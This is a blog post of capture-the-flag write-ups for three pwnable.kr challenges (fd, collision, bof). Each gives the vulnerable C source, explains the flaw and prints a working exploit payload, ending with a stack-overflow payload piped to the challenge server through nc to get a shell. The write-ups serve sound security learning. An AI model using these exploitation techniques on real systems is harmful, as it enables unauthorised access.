[{"content":"About pwnable.kr If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.\nIn this article, I will share my experience solving each challenge on pwnable.kr, as well as what I have learned along the way.\nfd - 1 pt // fd.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } We noticed that if buf == LETMEWIN then the program will start a new subprocess to execute \u0026quot;/bin/cat flag\u0026quot;. We can see the permission of the compiled file fd and flag are\n-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd -r--r----- 1 fd_pwn root 50 Jun 11 2014 flag This permission tells us that when we run fd as fd users, the euid of the process will be fd_pwn, which is good enough to read flag.\nNow it is quite clear on how to pwn this program.\nif(!strcmp(\u0026quot;LETMEWIN\\n\u0026quot;, buf)) -\u0026gt; let the string in buf equals to \u0026ldquo;LETMEWIN\\n\u0026rdquo;, so that the program can help us read the flag len = read(fd, buf, 32); -\u0026gt; let fd equals to 0 so that we can fill buf via standard input. int fd = atoi( argv[1] ) - 0x1234; let argv[1] equals 4660 (decimal representation of 0x1234) to make fd 0. final payload: echo \u0026#34;LETMEWIN\u0026#34; | ./fd $(python -c \u0026#34;print(0x1234)\u0026#34;) ps: echo adds a \\n by default.\ncollision - 3 pt // col.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u0026lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u0026lt;2){ printf(\u0026#34;usage : %s [passcode]\\n\u0026#34;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\u0026#34;passcode length should be 20 bytes\\n\u0026#34;); return 0; } if(hashcode == check_password( argv[1] )){ system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } else printf(\u0026#34;wrong passcode.\\n\u0026#34;); return 0; } To successfully run the program, we must provide 20 bytes as the first argument. The check_password function takes 20 bytes(the first argument), splits them into five groups of four bytes each, and treats each group as an integer. This gives us five integers in total. If the sum of these five integers equals the pre-defined hashcode value of 0x21DD09EC, then the flag will be printed. By performing some calculations, we can determine that the five integers needed to match hashcode are 0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cecc. Considering the little endian byte order, we can construct our final payload accordingly.\nfinal payload:\necho -en \u0026#34;\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\u0026#34; | xargs ./col bof - 5 pt // bof.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void func(int key){ char overflowme[32]; printf(\u0026#34;overflow me : \u0026#34;); gets(overflowme);\t// smash me! if(key == 0xcafebabe){ system(\u0026#34;/bin/sh\u0026#34;); } else{ printf(\u0026#34;Nah..\\n\u0026#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Classic stack buffer overflow. The root cause of the stack overflow is that the function designed to take user input, such as read, is longer than what it was intended to hold. Here we have gets, this function takes unlimited number of characters whereas overflowme array can only hold upto 32 bytes. In general, we can use a bof vulnerability to manipulate the rip or instruction pointer to control the program flow. However, in this case, the solution is simpler. All we need to do is change the key to 0xcafebabe to exploit this program. Since key is an argument rather than a local variable, we can overwrite the buffer overflowme from the beginning to the rbp/ebp+8 to change its value. It is important to note that system(\u0026quot;/bin/sh\u0026quot;) is a subprocess that will terminate when the parent process ends. Therefore, we use the cat trick to obtain a persistent shell.\nfinal payload:\n(echo -en \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\u0026#34;; cat) | nc pwnable.kr 9000 TBC\n","permalink":"https://0xlightyear.github.io/posts/pwnable_kr_writeups/","summary":"About pwnable.kr If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.","title":"pwnable.kr Writeups"}]